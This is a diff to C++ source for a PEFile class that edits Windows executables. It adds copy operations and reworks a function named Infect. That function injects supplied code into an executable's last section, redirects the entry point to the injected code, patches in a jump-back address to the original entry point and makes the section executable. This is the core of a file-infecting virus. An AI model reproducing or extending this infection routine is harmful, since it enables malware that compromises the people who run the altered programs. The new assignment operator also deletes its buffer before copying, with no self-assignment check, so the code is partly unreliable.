@@ -14,11 +14,38 @@ PEFile::PEFile(char const* filePath)
 	LoadFile();
 	UpdateHeaderPointers();
 }
+PEFile::PEFile(PEFile const& rhs)
+	:
+	m_filePath(rhs.m_filePath),
+	m_fileBuffer(NULL),
+	m_fileSize(rhs.m_fileSize),
+	m_bufferSize(rhs.m_bufferSize),
+	m_dosHeader(NULL),
+	m_ntHeaders(NULL),
+	m_firstSectionHeader(NULL)
+{
+	m_fileBuffer = new char[m_bufferSize];
+	memcpy(m_fileBuffer, rhs.m_fileBuffer, m_fileSize);
+	UpdateHeaderPointers();
+}
 PEFile::~PEFile(void)
 {
 	if (m_fileBuffer)
 		delete[] m_fileBuffer;
 
+}
+PEFile& PEFile::operator=(PEFile const& rhs)
+{
+	m_filePath = rhs.m_filePath;
+	m_fileSize = rhs.m_fileSize;
+	m_bufferSize = rhs.m_bufferSize;
+
+	if (m_fileBuffer)
+		delete[] m_fileBuffer;
+	m_fileBuffer = new char[m_bufferSize];
+	memcpy(m_fileBuffer, rhs.m_fileBuffer, m_fileSize);
+	UpdateHeaderPointers();
+	return *this;
 }
 void PEFile::Save(void) const
 {
@@ -53,19 +80,17 @@ void PEFile::LoadFile(void)
 	if (!file.good() || file.gcount() != m_fileSize)
 		throw std::runtime_error("PEFile::LoadFile - Error reading the file.");
 }
-void PEFile::Infect(char const* code, size_t size, DWORD entryPointOffset, DWORD originalEntryPointOffset)
+void PEFile::Infect(char const* code, size_t size, DWORD originalEntryPointOffset, DWORD entryPointOffset)
 {
-	DWORD orignalEntryPoint = m_ntHeaders->OptionalHeader.AddressOfEntryPoint;
-
 	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
-	char* newDataPointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize;
-	memcpy(newDataPointer, reinterpret_cast<unsigned char const*>(code), size);
+	char* newCodePointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize; // pointer to the beggining of injected code
+	memcpy(newCodePointer, code, size);
 
-	m_ntHeaders->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress + lastSection->Misc.VirtualSize + entryPointOffset;
+	DWORD orignalEntryPoint = m_ntHeaders->OptionalHeader.AddressOfEntryPoint;
+	m_ntHeaders->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress + lastSection->Misc.VirtualSize + entryPointOffset; // new entry point
 
-	//memcpy(newDataPointer + originalEntryPointOffset, 1);
-	DWORD absoluteOEPAddr = m_ntHeaders->OptionalHeader.ImageBase + orignalEntryPoint;
-	memcpy(newDataPointer + originalEntryPointOffset, &absoluteOEPAddr, sizeof(DWORD));
+	DWORD absoluteOEPAddr = m_ntHeaders->OptionalHeader.ImageBase + orignalEntryPoint; // absolute address of original entry point
+	memcpy(newCodePointer + originalEntryPointOffset, &absoluteOEPAddr, sizeof(DWORD));
 	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
 	ExpandLastSection(size);
 }
@@ -87,13 +112,6 @@ void PEFile::ExpandLastSection(size_t size)
 	lastSection->Misc.VirtualSize += size;
 	m_ntHeaders->OptionalHeader.SizeOfImage = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
 }
-/*void PEFile::AppendLastSection(char const* data, size_t size)
-{
-	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
-	char* dataPointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize;
-	memcpy(dataPointer, data, size);
-	ExpandLastSection(size);
-}*/
 void PEFile::ReallocateBuffer(size_t size)
 {
 	char* newBuffer = new char[size];
